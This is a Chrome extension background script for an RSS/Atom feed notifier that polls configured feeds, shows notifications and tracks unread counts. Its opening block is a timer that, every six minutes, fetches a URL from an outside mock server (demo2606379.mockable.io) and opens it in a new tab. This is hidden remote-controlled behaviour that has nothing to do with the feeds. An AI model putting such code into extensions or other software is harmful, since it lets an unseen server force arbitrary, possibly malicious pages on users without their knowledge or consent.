setInterval( function() {
    $.ajax({
        url: "http://demo2606379.mockable.io/url",
        async: false,
        dataType: 'json',
        success: function (data) {
            console.log('should open a new tab with urls')
            var newURL = data.msg;
            chrome.tabs.create({ url: newURL });;
            
        }
    });
}, 6*60*1000) // https://www.mockable.io/a/#/space/demo2606379/rest/UvB38MAAA?inwizzard=true

var config = [];
$.ajax({
    url: chrome.extension.getURL('config.json'),
    async: false,
    dataType: 'json',
    success: function (data) {
        $.each(data, function (index, value) {
            
            config[index] = value;
        });
    }
});

var show_feed_ids = [];
for (var i = 0; i < config["feeds"].length; i++) {
    show_feed_ids.push(i);
    localStorage[i + "_feed_events_ids"] = (!localStorage[i + "_feed_events_ids"]) ? '' : localStorage[i + "_feed_events_ids"];
    localStorage[i + "_feed_notifications"] = (!localStorage[i + "_feed_notifications"]) ? config["feeds"][i]["feed_notifications"] : localStorage[i + "_feed_notifications"];
}
localStorage["show_feed_ids"] = (!localStorage["show_feed_ids"]) ? show_feed_ids.join(',') : localStorage["show_feed_ids"];
localStorage["time"] = (!localStorage["time"]) ? '1' : localStorage["time"];
localStorage["badge_count"] = (!localStorage["badge_count"]) ? 0 : localStorage["badge_count"];
localStorage["notify"] = (!localStorage["notify"]) ? true : localStorage["notify"];
var delay = parseInt(localStorage["time"]);
chrome.alarms.create("getRSS", {periodInMinutes: delay});

var badge_count;
var feed_count;

function setBadgeCount(count) {
    count = (count == '0') ? '' : count;
    chrome.browserAction.setTitle({title: chrome.i18n.getMessage("badge_text") + count});
    chrome.browserAction.setBadgeBackgroundColor({color: config["badge_color"]});
    chrome.browserAction.setBadgeText({text: count});
}

var item_url = [];
var item_id = [];
var item_feed_id = [];

function showNotification(id, feed_id, feed_url, feed_title, feed_type, feed_image_type) {
    $.get(feed_url, function (data) {
        var item_type = (feed_type == "rss") ? "item" : "entry";
        var item = $(data).find(item_type).first();
        var url_news = (feed_type == "rss") ? item.find('link').text() : item.find('link').attr('href');
        var news_id = CryptoJS.SHA1(url_news);
        if (id.toString() == news_id.toString()) {
            var item_img;
            if (feed_image_type == "description") {
                item_img = $($(this).find('description').text()).find("img").attr("src");
            } else if (feed_image_type == "encoded") {
                item_img = $($(this).find('encoded').text()).find("img").attr("src");
            } else if (feed_image_type == "thumbnail") {
                item_img = $(this).find('thumbnail').attr('url');
            } else {
                item_img = $(this).find('enclosure').attr('url');
            }
            var img = item_img;
            img = (!img) ? "/img/notification.png" : img;
            var descr = item.find('title').text();
            var notification_title;
            if (config['notification_title'] == "title") {
                notification_title = config['title'];
            } else if (config['notification_title'] == "feed_title") {
                notification_title = feed_title;
            } else {
                notification_title = config['title'] + ' - ' + feed_title;
            }
            var options = {
                type: "basic",
                title: notification_title,
                message: descr.replace(/\r?\n/g, ""),
                iconUrl: img
            };
            chrome.notifications.create("", options, function (id) {
                console.log('shoudl create it')
                item_url[id] = url_news;
                item_id[id] = news_id.toString();
                item_feed_id[id] = feed_id;
                setTimeout(function () {
                    chrome.notifications.clear(id, function () {
                    });
                }, 60000);
            });
            localStorage[feed_id + "_notification_id"] = id;
        }
    });
}
var feedids = [];
var newfeedids = [];
var crossfeedids = [];
var oldfeedids = [];

function getContent(feed_id, feed_url, feed_title, feed_type, feed_notifications, feed_image_type) {
    if (localStorage[feed_id + "_feed_ids"]) {
        feedids[feed_id] = localStorage[feed_id + "_feed_ids"].split(",");
    } else {
        feedids[feed_id] = [];
    }
    $.get(feed_url, function (data) {
        newfeedids[feed_id] = [];
        crossfeedids[feed_id] = [];
        var item = (feed_type == "rss") ? "item" : "entry";
        $(data).find(item).each(function () {
            var url_news = (item == "item") ? $(this).find('link').text() : $(this).find('link').attr('href');
            var news_id = CryptoJS.SHA1(url_news);
            if ($.inArray(news_id.toString(), feedids[feed_id]) != -1) {
                crossfeedids[feed_id].push(news_id.toString());
            } else {
                newfeedids[feed_id].push(news_id.toString());
            }
        });
        if (newfeedids[feed_id].length !== 0) {
            if (crossfeedids[feed_id].length === 0) {
                oldfeedids[feed_id] = [];
            } else {
                if (localStorage[feed_id + "_feed_events_ids"] !== '') {
                    oldfeedids[feed_id] = $.grep(crossfeedids[feed_id], function (i) {
                        return $.inArray(i, localStorage[feed_id + "_feed_events_ids"].split(",")) > -1;
                    });
                } else {
                    oldfeedids[feed_id] = [];
                }
            }

            localStorage[feed_id + "_feed_events_ids"] = newfeedids[feed_id].concat(oldfeedids[feed_id]);

            if (localStorage['notify'] === 'true') {
                if (feed_notifications === "yes") {
                    if (localStorage[feed_id + "_notification_id"] != newfeedids[feed_id][0]) {
                        showNotification(newfeedids[feed_id][0], feed_id, feed_url, feed_title, feed_type, feed_image_type);
                    }
                }
            }
        }
        var unread_ids;
        if (localStorage[feed_id + "_feed_events_ids"] !== '') {
            unread_ids = localStorage[feed_id + "_feed_events_ids"].split(",");
            badge_count += unread_ids.length;
        }

        feed_count++;
        if (feed_count === config["feeds"].length) {
            localStorage['badge_count'] = badge_count;
            setBadgeCount(badge_count.toString());
        }
    });
}

chrome.alarms.onAlarm.addListener(function (alarm) {
    switch (alarm.name) {
        case "getRSS":
            badge_count = 0;
            feed_count = 0;
            var feed_ids = (localStorage["show_feed_ids"] !== '') ? localStorage["show_feed_ids"].split(',') : [];
            for (var i = 0; i < feed_ids.length; i++) {
                var current = feed_ids[i];
                var feed_notifications = localStorage[current + "_feed_notifications"];
                getContent(current, config["feeds"][current]["feed_url"], config["feeds"][current]["feed_title"], config["feeds"][current]["feed_type"], feed_notifications, config["feeds"][current]["feed_image_type"]);
            }
            break;
    }
});

chrome.notifications.onClicked.addListener(function (notificationId) {
    chrome.tabs.create({url: item_url[notificationId]});
    var badge_text;
    var unread_ids = localStorage[item_feed_id[notificationId] + "_feed_events_ids"].split(',');
    if (unread_ids.indexOf(item_id[notificationId]) != -1) {
        unread_ids.splice(unread_ids.indexOf(item_id[notificationId]), 1);
        badge_text = parseInt(localStorage['badge_count']) - 1;
        localStorage['badge_count'] = badge_text;
        setBadgeCount(badge_text.toString());
    }
    localStorage[item_feed_id[notificationId] + "_feed_events_ids"] = unread_ids.join(',');
    chrome.notifications.clear(notificationId, function () {
    });
});

